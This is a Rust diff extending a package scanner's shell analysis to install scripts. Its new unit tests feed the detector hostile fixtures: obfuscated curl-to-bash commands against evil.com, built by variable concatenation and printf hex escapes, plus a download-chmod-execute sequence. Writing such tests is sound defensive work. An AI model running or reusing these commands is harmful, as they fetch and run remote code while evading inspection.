@@ -110,19 +110,36 @@ pub struct ShellAnalysis;
 
 impl Feature for ShellAnalysis {
     fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
-        let Some(ref content) = ctx.pkgbuild_content else {
-            return Vec::new();
-        };
-
-        let env = build_var_env(content);
         let mut signals = Vec::new();
-        signals.extend(analyze_variable_resolution(content, &env));
-        signals.extend(analyze_indirect_execution(content, &env));
-        signals.extend(analyze_charbychar_construction(content));
-        signals.extend(analyze_data_blobs(content));
-        signals.extend(analyze_binary_download(content));
+
+        if let Some(ref content) = ctx.pkgbuild_content {
+            signals.extend(analyze_content(content, "", ""));
+        }
+        if let Some(ref content) = ctx.install_script_content {
+            signals.extend(analyze_content(content, "IS-", "(in install script)"));
+        }
+
         signals
     }
+}
+
+fn analyze_content(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
+    let env = build_var_env(content);
+    let mut signals = Vec::new();
+    signals.extend(analyze_variable_resolution(content, &env));
+    signals.extend(analyze_indirect_execution(content, &env));
+    signals.extend(analyze_charbychar_construction(content));
+    signals.extend(analyze_data_blobs(content));
+    signals.extend(analyze_binary_download(content));
+
+    if !id_prefix.is_empty() {
+        for sig in &mut signals {
+            sig.id = format!("{}{}", id_prefix, sig.id);
+            sig.description = format!("{} {}", sig.description, desc_suffix);
+        }
+    }
+
+    signals
 }
 
 // --- Helpers ---
@@ -759,5 +776,61 @@ package() {
         let content = format!("sha512sums=('{sha512}'\n            '{sha512}')");
         let ids = analyze(&content);
         assert!(!has(&ids, "SA-DATA-BLOB-HEX"), "SHA-512 in multi-line array should not trigger");
+    }
+
+    // --- Install script analysis ---
+
+    fn analyze_install(content: &str) -> Vec<String> {
+        let ctx = PackageContext {
+            name: "test-pkg".into(),
+            metadata: None,
+            pkgbuild_content: None,
+            install_script_content: Some(content.into()),
+            prior_pkgbuild_content: None,
+            git_log: vec![],
+            maintainer_packages: vec![],
+        };
+        ShellAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+    }
+
+    #[test]
+    fn install_var_concat_curl_pipe_bash() {
+        let ids = analyze_install("a=cu\nb=rl\n$a$b http://evil.com | bash");
+        assert!(has(&ids, "IS-SA-VAR-CONCAT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_indirect_exec() {
+        let ids = analyze_install("x=bash\necho id | $x");
+        assert!(has(&ids, "IS-SA-INDIRECT-EXEC"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_charbychar() {
+        let ids = analyze_install(
+            r"$(printf '\x63')$(printf '\x75')$(printf '\x72')$(printf '\x6c') http://evil.com",
+        );
+        assert!(has(&ids, "IS-SA-CHARBYCHAR-CONSTRUCT"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_data_blob_hex() {
+        let hex = "a1".repeat(80);
+        let ids = analyze_install(&format!("data=\"{hex}\""));
+        assert!(has(&ids, "IS-SA-DATA-BLOB-HEX"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_binary_download() {
+        let ids = analyze_install(
+            "curl -o /tmp/tool https://evil.com/tool\nchmod +x /tmp/tool\n/tmp/tool",
+        );
+        assert!(has(&ids, "IS-SA-BINARY-DOWNLOAD-NOCOMPILE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_benign_no_signals() {
+        let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
+        assert!(ids.is_empty(), "benign install script should trigger no signals, got: {ids:?}");
     }
 }
